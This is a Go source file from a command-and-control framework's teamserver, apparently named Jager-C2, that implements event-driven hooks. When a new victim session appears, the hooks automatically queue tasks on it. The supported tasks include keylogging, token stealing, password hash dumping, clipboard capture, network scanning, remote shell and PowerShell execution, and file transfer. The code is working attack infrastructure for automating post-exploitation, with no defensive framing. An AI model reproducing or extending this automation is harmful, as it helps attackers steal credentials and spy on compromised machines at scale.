package scripting

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/0xhackerfren/Jager-C2/teamserver/internal/events"
	pb "github.com/0xhackerfren/Jager-C2/teamserver/proto/jagerpb"
	"go.uber.org/zap"
	"google.golang.org/protobuf/types/known/timestamppb"
)

// Hook represents an automated response to a C2 event.
type Hook struct {
	Name      string           `json:"name"`
	EventType events.EventType `json:"event_type"`
	Action    HookAction       `json:"action"`
	Enabled   bool             `json:"enabled"`
	Condition string           `json:"condition,omitempty"`
}

// HookAction defines what happens when a hook fires.
type HookAction struct {
	Type    string `json:"type"`    // "task", "notify", "multi_task"
	Command string `json:"command"` // for "task": task type name (e.g. "TASK_SCREENSHOT")
	Data    string `json:"data"`    // optional: task payload
	Tasks   []struct {
		Command string `json:"command"`
		Data    string `json:"data"`
		Delay   int    `json:"delay_ms"`
	} `json:"tasks,omitempty"` // for "multi_task": sequential tasks
}

// TaskEnqueuer allows the scripting engine to queue tasks on sessions.
type TaskEnqueuer interface {
	Enqueue(task *pb.Task) error
}

type Engine struct {
	mu       sync.RWMutex
	hooks    []Hook
	bus      *events.Bus
	tasks    TaskEnqueuer
	logger   *zap.Logger
	history  []HookExecution
	maxHist  int
}

type HookExecution struct {
	HookName  string    `json:"hook_name"`
	EventType string    `json:"event_type"`
	SessionID string    `json:"session_id"`
	Timestamp time.Time `json:"timestamp"`
	Success   bool      `json:"success"`
	Error     string    `json:"error,omitempty"`
}

func NewEngine(bus *events.Bus, logger *zap.Logger) *Engine {
	return &Engine{
		bus:     bus,
		logger:  logger.Named("scripting"),
		maxHist: 200,
	}
}

func (e *Engine) SetTaskEnqueuer(tq TaskEnqueuer) {
	e.mu.Lock()
	e.tasks = tq
	e.mu.Unlock()
}

func (e *Engine) RegisterHook(h Hook) {
	e.mu.Lock()
	e.hooks = append(e.hooks, h)
	e.mu.Unlock()
}

func (e *Engine) RemoveHook(name string) bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	for i, h := range e.hooks {
		if h.Name == name {
			e.hooks = append(e.hooks[:i], e.hooks[i+1:]...)
			return true
		}
	}
	return false
}

func (e *Engine) ListHooks() []Hook {
	e.mu.RLock()
	defer e.mu.RUnlock()
	out := make([]Hook, len(e.hooks))
	copy(out, e.hooks)
	return out
}

func (e *Engine) GetHistory(limit int) []HookExecution {
	e.mu.RLock()
	defer e.mu.RUnlock()
	if limit <= 0 || limit > len(e.history) {
		limit = len(e.history)
	}
	start := len(e.history) - limit
	out := make([]HookExecution, limit)
	copy(out, e.history[start:])
	return out
}

// Start listens for events and triggers hooks.
func (e *Engine) Start() {
	if e.bus == nil {
		return
	}
	ch := e.bus.Subscribe()
	go func() {
		for event := range ch {
			e.mu.RLock()
			for _, hook := range e.hooks {
				if hook.Enabled && hook.EventType == event.Type {
					go e.executeHook(hook, event)
				}
			}
			e.mu.RUnlock()
		}
	}()
}

var taskTypeMap = map[string]pb.TaskType{
	"TASK_SHELL":             pb.TaskType_TASK_SHELL,
	"TASK_POWERSHELL":        pb.TaskType_TASK_POWERSHELL,
	"TASK_SCREENSHOT":        pb.TaskType_TASK_SCREENSHOT,
	"TASK_PS":                pb.TaskType_TASK_PS,
	"TASK_NETSTAT":           pb.TaskType_TASK_NETSTAT,
	"TASK_IFCONFIG":          pb.TaskType_TASK_IFCONFIG,
	"TASK_ARP_SCAN":          pb.TaskType_TASK_ARP_SCAN,
	"TASK_KEYLOG_START":      pb.TaskType_TASK_KEYLOG_START,
	"TASK_KEYLOG_STOP":       pb.TaskType_TASK_KEYLOG_STOP,
	"TASK_TOKEN_STEAL":       pb.TaskType_TASK_TOKEN_STEAL,
	"TASK_HASHDUMP":          pb.TaskType_TASK_HASHDUMP,
	"TASK_CLIPBOARD":         pb.TaskType_TASK_CLIPBOARD,
	"TASK_PORTSCAN":          pb.TaskType_TASK_PORTSCAN,
	"TASK_DOWNLOAD":          pb.TaskType_TASK_DOWNLOAD,
	"TASK_UPLOAD":            pb.TaskType_TASK_UPLOAD,
}

func resolveTaskType(name string) (pb.TaskType, bool) {
	name = strings.ToUpper(strings.TrimSpace(name))
	if !strings.HasPrefix(name, "TASK_") {
		name = "TASK_" + name
	}
	tt, ok := taskTypeMap[name]
	return tt, ok
}

func (e *Engine) executeHook(h Hook, ev events.Event) {
	sessionID := ev.SessionID
	if sessionID == "" {
		e.recordExec(h, ev, false, "no session_id in event")
		return
	}

	if e.tasks == nil {
		e.recordExec(h, ev, false, "no task enqueuer attached")
		e.logger.Warn("hook cannot execute: no task enqueuer", zap.String("hook", h.Name))
		return
	}

	switch h.Action.Type {
	case "task":
		err := e.enqueueTask(sessionID, h.Action.Command, h.Action.Data)
		if err != nil {
			e.recordExec(h, ev, false, err.Error())
			e.logger.Error("hook task failed", zap.String("hook", h.Name), zap.Error(err))
		} else {
			e.recordExec(h, ev, true, "")
			e.logger.Info("hook task queued",
				zap.String("hook", h.Name),
				zap.String("session", sessionID),
				zap.String("task", h.Action.Command))
		}

	case "multi_task":
		var lastErr error
		for _, t := range h.Action.Tasks {
			if t.Delay > 0 {
				time.Sleep(time.Duration(t.Delay) * time.Millisecond)
			}
			if err := e.enqueueTask(sessionID, t.Command, t.Data); err != nil {
				lastErr = err
				e.logger.Error("hook multi_task item failed",
					zap.String("hook", h.Name), zap.String("task", t.Command), zap.Error(err))
			}
		}
		e.recordExec(h, ev, lastErr == nil, fmt.Sprintf("%d tasks queued", len(h.Action.Tasks)))

	case "notify":
		e.logger.Info("hook notification",
			zap.String("hook", h.Name),
			zap.String("session", sessionID),
			zap.String("message", h.Action.Command))
		e.recordExec(h, ev, true, "")

	default:
		e.recordExec(h, ev, false, "unknown action type: "+h.Action.Type)
	}
}

func (e *Engine) enqueueTask(sessionID, command, data string) error {
	taskType, ok := resolveTaskType(command)
	if !ok {
		return fmt.Errorf("unknown task type: %s", command)
	}

	task := &pb.Task{
		Id:          fmt.Sprintf("hook-%d", time.Now().UnixNano()),
		SessionId:   sessionID,
		Type:        taskType,
		State:       pb.TaskState_TASK_STATE_QUEUED,
		RequestData: []byte(data),
		CreatedAt:   timestamppb.Now(),
	}
	return e.tasks.Enqueue(task)
}

func (e *Engine) recordExec(h Hook, ev events.Event, success bool, errMsg string) {
	e.mu.Lock()
	defer e.mu.Unlock()
	exec := HookExecution{
		HookName:  h.Name,
		EventType: string(ev.Type),
		SessionID: ev.SessionID,
		Timestamp: time.Now(),
		Success:   success,
		Error:     errMsg,
	}
	e.history = append(e.history, exec)
	if len(e.history) > e.maxHist {
		e.history = e.history[len(e.history)-e.maxHist:]
	}
}

// LoadHooksFromDir loads JSON hook definitions from a directory.
func (e *Engine) LoadHooksFromDir(dir string) error {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		if filepath.Ext(entry.Name()) != ".json" {
			continue
		}
		data, err := os.ReadFile(filepath.Join(dir, entry.Name()))
		if err != nil {
			continue
		}
		var hook Hook
		if json.Unmarshal(data, &hook) == nil && hook.Name != "" {
			if hook.EventType == "" {
				hook.EventType = events.EventSessionNew
			}
			e.RegisterHook(hook)
			e.logger.Debug("loaded hook", zap.String("name", hook.Name), zap.String("file", entry.Name()))
		}
	}
	return nil
}
